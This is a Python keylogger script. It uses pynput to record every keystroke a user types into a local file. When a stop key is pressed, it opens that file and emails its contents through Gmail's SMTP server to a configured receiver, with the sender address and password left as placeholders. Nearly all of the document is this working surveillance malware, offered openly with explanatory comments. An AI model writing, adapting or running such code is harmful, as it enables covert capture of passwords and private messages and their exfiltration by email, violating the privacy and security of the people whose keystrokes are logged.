import webbrowser, time
from pynput import keyboard
import smtplib, ssl


# TO send mail to the user. Here you've to provide sender's mail address and reciver's mail address 
# Also provide the password.

sender_mail = "Enter sender email address"
receiver_mail = "Enter receiver email address"
password = "password"
port = 25
message = """
From: Enter sender email address
To: Enter receiver email address          
Subject: KeyLogs

Text: Keylogs 
"""

# We create a file to store the keystrokes.
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()



def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))


def on_key_release(Key):

    """ 
    This stops the Listener/Keylogger.
    To stop this you have to allocate a key of your choice here I've given "Esc + Tab" key when 
    pressed program will terminate and file will open in the web browser after a intervel of 5 
    sec with the help of sleep() function.
    """ 

    if(Key == keyboard.Key.esc and keyboard.Key.tab):
        time.sleep(5)
        webbrowser.open('keylogger.txt')
        return False


with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
    listener.join()


with open("keylogger.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()


context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, password)
server.sendmail(sender_mail, receiver_mail, message)
print("Email Sent to ", sender_mail)
server.quit()